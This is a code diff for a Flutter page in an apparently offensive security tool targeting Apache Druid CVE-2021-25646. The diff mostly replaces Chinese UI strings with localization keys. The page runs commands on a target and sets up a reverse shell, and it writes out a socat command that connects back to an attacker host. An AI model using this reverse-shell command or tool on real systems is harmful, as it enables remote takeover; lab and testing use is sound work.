@@ -6,6 +6,7 @@ import '../../services/reverse_shell_service.dart';
 import '_vulhub_page_helpers.dart';
 import 'base_vulhub_exp_page.dart';
 import '../reverse_shell_terminal_page.dart';
+import '../../app/localization.dart';
 
 class DruidExpPage extends BaseVulhubExpPage {
   const DruidExpPage({super.key});
@@ -19,13 +20,13 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
   IconData get pageIcon => Icons.data_object;
 
   @override
-  String get appBarTitle => 'Apache Druid CVE-2021-25646 嵌入式 JavaScript RCE';
+  String get appBarTitle => S.vulhubDruidTitle;
 
   @override
-  String get cardTitle => 'Apache Druid CVE-2021-25646';
+  String get cardTitle => S.vulhubDruidCardTitle;
 
   @override
-  String get cardSubtitle => 'Sampler 接口强制执行用户提供的 JavaScript 代码，影响 <= 0.20.0';
+  String get cardSubtitle => S.vulhubDruidCardSubtitle;
 
   final _urlCtrl = TextEditingController();
   final _cmdCtrl = TextEditingController(text: 'id');
@@ -45,22 +46,24 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
   }
 
   DruidExpService _svc() => DruidExpService(
-        baseUrl: _urlCtrl.text.trim(),
-        timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
-      );
+    baseUrl: _urlCtrl.text.trim(),
+    timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
+  );
 
   Future<void> _check() async {
     if (_urlCtrl.text.trim().isEmpty) {
-      appendLog('[!] 请输入目标 URL');
+      appendLog(S.expLogEnterTargetUrl);
       return;
     }
     setState(() => running = true);
     appendLog('[*] 检测 CVE-2021-25646...');
     try {
       final r = await _svc().check();
-      appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到漏洞');
+      appendLog(
+        r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : S.expLogNoVulnGeneric,
+      );
     } catch (e) {
-      appendLog('[!] 异常: $e');
+      appendLog(S.expLogException(e));
     } finally {
       if (mounted) setState(() => running = false);
     }
@@ -68,7 +71,7 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
 
   Future<void> _exec() async {
     if (_urlCtrl.text.trim().isEmpty) {
-      appendLog('[!] 请输入目标 URL');
+      appendLog(S.expLogEnterTargetUrl);
       return;
     }
     final cmd = _cmdCtrl.text.trim().isEmpty ? 'id' : _cmdCtrl.text.trim();
@@ -76,9 +79,11 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
     appendLog('[*] 执行命令: $cmd');
     try {
       final out = await _svc().execRce(cmd);
-      appendLog(out != null && out.isNotEmpty ? '[+] 输出:\n$out' : '[-] 无输出或执行失败');
+      appendLog(
+        out != null && out.isNotEmpty ? '[+] 输出:\n$out' : '[-] 无输出或执行失败',
+      );
     } catch (e) {
-      appendLog('[!] 异常: $e');
+      appendLog(S.expLogException(e));
     } finally {
       if (mounted) setState(() => running = false);
     }
@@ -86,7 +91,7 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
 
   Future<void> _showReverseShellDialog() async {
     if (_urlCtrl.text.trim().isEmpty) {
-      appendLog('[!] 请输入目标 URL');
+      appendLog(S.expLogEnterTargetUrl);
       return;
     }
     final mode = await showReverseShellModeDialog(context);
@@ -95,7 +100,7 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
     final lhost = _lhostCtrl.text.trim();
     final lport = int.tryParse(_lportCtrl.text.trim()) ?? 4444;
     if (lhost.isEmpty || lport <= 0 || lport > 65535) {
-      appendLog('[!] LHOST/LPORT 无效');
+      appendLog(S.expLogInvalidLhostLport);
       return;
     }
 
@@ -109,30 +114,32 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
       session.label = 'Druid-CVE-2021-25646';
       if (!mounted) return;
       nav.push(
-        MaterialPageRoute(builder: (_) => ReverseShellTerminalPage(session: session)),
+        MaterialPageRoute(
+          builder: (_) => ReverseShellTerminalPage(session: session),
+        ),
       );
     };
 
     setState(() => running = true);
-    appendLog('[*] 启动完整终端监听: $lhost:$lport ($mode)');
+    appendLog(S.expLogStartFullTerminalListen(lhost, lport, mode));
     try {
       await _rs.startListening(port: lport);
 
       if (mode == 'socat') {
         final cmd =
             "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport";
-        appendLog('[i] 在目标执行 socat 命令建立连接:');
+        appendLog(S.expLogSocatRunOnTarget);
         appendLog(cmd);
         if (mounted) {
           await showDialog<void>(
             context: context,
             builder: (_) => AlertDialog(
-              title: const Text('socat 反弹命令'),
+              title: Text(S.titleSocatCommand),
               content: SelectableText(cmd),
               actions: [
                 TextButton(
                   onPressed: () => Navigator.of(context).pop(),
-                  child: const Text('关闭'),
+                  child: Text(S.btnClose),
                 ),
               ],
             ),
@@ -144,10 +151,10 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
           lport,
           preferScript: mode == 'script',
         );
-        appendLog(ok ? '[+] 已发送反弹 shell，等待连接...' : '[-] 发送失败');
+        appendLog(ok ? S.expLogReverseSentWaiting : S.expLogSendFailed);
       }
     } catch (e) {
-      appendLog('[!] 启动失败: $e');
+      appendLog(S.expLogStartFailed(e));
     } finally {
       if (mounted) setState(() => running = false);
     }
@@ -169,29 +176,34 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
       child: Column(
         crossAxisAlignment: CrossAxisAlignment.start,
         children: [
-          vSecTitle('目标配置'),
-          vTf(_urlCtrl, '目标 URL', 'http://localhost:8080'),
+          vSecTitle(S.sectionTargetConfig),
+          vTf(_urlCtrl, S.fieldTargetUrl, 'http://localhost:8080'),
           const SizedBox(height: 8),
           vTf(
             _timeoutCtrl,
-            '超时(s)',
+            S.fieldTimeout,
             '${AppConstants.defaultHttpTimeoutSeconds}',
             type: TextInputType.number,
           ),
           const SizedBox(height: 8),
-          vBtn('检测漏洞', running ? null : _check),
+          vBtn(S.btnDetectVuln, running ? null : _check),
           const SizedBox(height: 16),
-          vSecTitle('命令执行'),
-          vTf(_cmdCtrl, '命令', 'id'),
+          vSecTitle(S.sectionCmdExec),
+          vTf(_cmdCtrl, S.fieldCommand, 'id'),
           const SizedBox(height: 8),
-          vBtn('执行命令', running ? null : _exec),
+          vBtn(S.btnExecCmd, running ? null : _exec),
           const SizedBox(height: 16),
-          vSecTitle('GetShell（反弹 Shell）'),
-          vTf(_lhostCtrl, '攻击机 IP', '127.0.0.1'),
+          vSecTitle(S.sectionGetShell),
+          vTf(_lhostCtrl, S.fieldAttackerIp, '127.0.0.1'),
           const SizedBox(height: 8),
-          vTf(_lportCtrl, '攻击机端口', '4444', type: TextInputType.number),
+          vTf(
+            _lportCtrl,
+            S.fieldAttackerPort,
+            '4444',
+            type: TextInputType.number,
+          ),
           const SizedBox(height: 8),
-          vBtn('GetShell', running ? null : _showReverseShellDialog),
+          vBtn(S.btnGetShell, running ? null : _showReverseShellDialog),
         ],
       ),
     );
